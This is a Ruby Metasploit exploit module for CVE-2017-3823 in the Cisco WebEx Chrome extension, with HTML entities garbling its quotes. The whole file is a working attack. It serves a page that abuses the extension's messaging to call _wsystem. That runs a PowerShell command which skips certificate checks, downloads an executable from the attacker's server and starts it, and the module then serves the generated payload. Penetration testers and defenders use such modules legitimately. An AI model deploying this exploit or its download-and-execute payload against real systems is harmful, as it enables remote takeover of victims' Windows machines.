# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Cisco WebEx Chrome Extension RCE (CVE-2017-3823)",
      &#039;Description&#039;    => %q{
        version 1.0.1 which allows an attacker to execute arbitrary commands on a system.
        },
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
        [
          &#039;Tavis Ormandy <taviso@google.com>&#039;,                # Original research/PoC
          &#039;William Webb <william_webb[at]rapid7.com>&#039;         # Metasploit module
        ],
        &#039;Platform&#039;       => &#039;win&#039;,
        &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true,
        },
        &#039;Targets&#039;        =>
        [
          [ &#039;Cisco WebEx Extension 1.0.1&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Arch&#039;     => ARCH_X86,
            }
          ],
        ],
        &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-3823&#039; ],
        ],
        &#039;Arch&#039;           => ARCH_X86,
        &#039;DisclosureDate&#039; => "Jan 21 2017",
        &#039;DefaultTarget&#039;  => 0
        ))
end

def setup
  @payload_uri = "#{Rex::Text.rand_text_alphanumeric(8)}"
  @payload_exe = "#{Rex::Text.rand_text_alpha(8)}.exe"
  super
end

def exploit_html(cli, req_uri)
  base_uri = "#{get_resource.chomp(&#039;/&#039;)}"
  html = %Q~
<html>
<head>
<script>
var msg = {
    GpcProductRoot: "WebEx",
    GpcMovingInSubdir: "Wanta",
    GpcProductVersion: "T30_MC",
    GpcUnpackName: "atgpcdec",
    GpcExtName: "atgpcext",
    GpcUnpackVersion: "27, 17, 2016, 501",
    GpcExtVersion: "3015, 0, 2016, 1117",
    GpcUrlRoot: "http://127.0.0.1/",
    GpcComponentName: btoa("MSVCR100.DLL"),
    GpcFullPage: "True",
    GpcInitCall: btoa("_wsystem(Ex1);"),
    Ex1: btoa("PowerShell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; $wc = New-Object System.Net.WebClient ; $pl = $env:temp+&#039;\\#{@payload_exe}&#039; ; $wc.DownloadFile(&#039;https://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}#{base_uri}/#{@payload_uri}&#039;, $pl) ; Start-Process $pl"),
}

function runcode()
{
    document.dispatchEvent(new CustomEvent("connect", { detail: { token: "token" }}));
    document.dispatchEvent(new CustomEvent("message", { detail: {
            message: JSON.stringify(msg),
            message_type: "launch_meeting",
            timestamp: (new Date()).toUTCString(),
            token: "token"
        }
    }));
}
</script>
</head>
<body onload="runcode()">

</body>
</html>
  ~

  send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Cache-Control&#039; => &#039;no-cache&#039;, &#039;Connection&#039; => &#039;close&#039; })
end

def on_request_uri(cli, request)
  print_status("Got request: #{request.uri}")
  print_status("From: #{request.headers[&#039;User-Agent&#039;]}")

  if request.uri =~ /cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b\.html/
    print_status("Sending exploit html ...")
    exploit_html(cli, request.uri)
    close_client(cli)
    return
  elsif request.uri =~ /.*#{@payload_uri}$/
    return if ((payload = regenerate_payload(cli)) == nil)
    print_status("Sending payload ...")
    send_response(cli, generate_payload_exe({ :code => payload.encoded }), { &#039;Content-Type&#039; => &#039;application/octet-stream&#039;, &#039;Connection&#039; => &#039;close&#039; })
  else
    base_uri = "#{get_resource.chomp(&#039;/&#039;)}"
    html = %Q~
    <html>
    <head>
    <meta http-equiv="refresh" content="0; URL=&#039;#{get_resource}/cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b.html&#039; />"
    </head>
    <body>
    </body>
    </html>
    ~
    send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Cache-Control&#039; => &#039;no-cache&#039;, &#039;Connection&#039; => &#039;close&#039; })
    close_client(cli)
  end
  end
end

